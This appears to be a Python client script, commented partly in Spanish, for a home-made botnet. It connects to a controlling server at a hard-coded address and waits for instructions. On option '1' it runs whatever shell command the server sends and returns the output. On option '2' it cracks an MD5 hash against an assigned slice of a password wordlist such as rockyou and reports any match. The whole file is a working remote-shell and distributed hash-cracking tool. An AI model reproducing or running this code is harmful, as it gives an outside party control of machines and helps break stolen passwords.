import socket
from os import popen, _exit
from hashlib import md5
import numpy as np
from time import perf_counter
SERVER_IP = "192.168.1.46"#"127.0.0.1"  # can also be the hostname basicamente la IP del servidor
PORT = 6667
HEADERSIZE = 16

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, PORT))
print("conectado")

def executeCMD(cmd:str):
    return popen(cmd).read() # return the result
def messageSender(info:str,client_socket:socket.socket):# Send message to server
    message = info.encode("utf-8") # el tamaño del mensaje + el mensaje 
    message_header = f"{len(message):<{HEADERSIZE}}".encode("utf-8")
    print("SENDING", message_header+message)
    client_socket.send(message_header + message)
def byte_messageSender(message,client_socket:socket.socket):# Send message to server
    # el tamaño del mensaje + el mensaje 
    message_header = f"{len(message):<{HEADERSIZE}}".encode("utf-8")
    print("SENDING", message_header+message)
    client_socket.send(message_header + message)

def listen_for_messages(client_socket:socket.socket):
    header = client_socket.recv(HEADERSIZE).decode()
    message = client_socket.recv(int(header.strip())).decode()
    print("MSG:",message)
    return message
def hashDecripter(HASH_OBJETIVO:str): #from-to-bytes (int-int), wordlist(rockyou o no) # receive1o0
    global client_socket
    response:bytes = b"0" # la respuesta negativa
    p=0
    while True:
        start_while = perf_counter()
        tmp_ftbytes=listen_for_messages(client_socket)
        print("listen 4 mess",perf_counter()-start_while)
        if tmp_ftbytes == "STOP":
            break
        from_to_bytes = tmp_ftbytes.split("-")        ###### HAY QUE ENVIAAAAR FROM-TO-BYTES(INT)
        print("First",from_to_bytes[0],"Last:",from_to_bytes[-1])
        wordlist = listen_for_messages(client_socket)
        print("Wordlist",wordlist)            #"C:\\Users\\user\\Downloads\\rockyou.txt" \
        # wordlist = "rockyou_limpio.txt" \
        #             if tmp_wd=="rockyou" \
        #             else "realhuman_phill.txt"                      ###### EL NOMBRE DE LA WORDLIST
        
        
        print("FROM-TO-BYTES = ",from_to_bytes)
        print("WORDLIST = ",wordlist)
        pre_file_read = perf_counter()
        lines= np.fromfile( wordlist,dtype=np.byte,offset=int(from_to_bytes[0]),count=int(from_to_bytes[1])-int(from_to_bytes[0])
                            ).tobytes().splitlines()
        post_file_read = perf_counter()
        print("File read =",post_file_read-pre_file_read, "Number of lines",len(lines))
        print()
        for a in lines:
            p+=1
            if p %1000000==0:
                print("Line = ",p, "Value",a)
            if md5(a).hexdigest() == HASH_OBJETIVO:
                print(a," = ", HASH_OBJETIVO)
                response = b"1"+a
                break
        print("Post md5:",perf_counter()-post_file_read)
        byte_messageSender(response,client_socket=client_socket)
    
    
    

    


while True: 
    print("listen_for_messages")
    cmd = listen_for_messages(client_socket)
    print("Post listen_for_messages\n option",cmd[0])
   
    if cmd[0] == "0":
        print("Saliendo")
        _exit(0)
    elif cmd[0] == "1":
        result = executeCMD(cmd=cmd[1:])
        print("EXEC_CMD: "+result)
        messageSender(result,client_socket=client_socket)
    elif cmd[0] == "2": #hash_ojetivo decrypt
        print("DECRYPT HASH: "+ cmd[1:])
        hashDecripter(cmd[1:])
    else:
        print("Error inesperado")
    
    
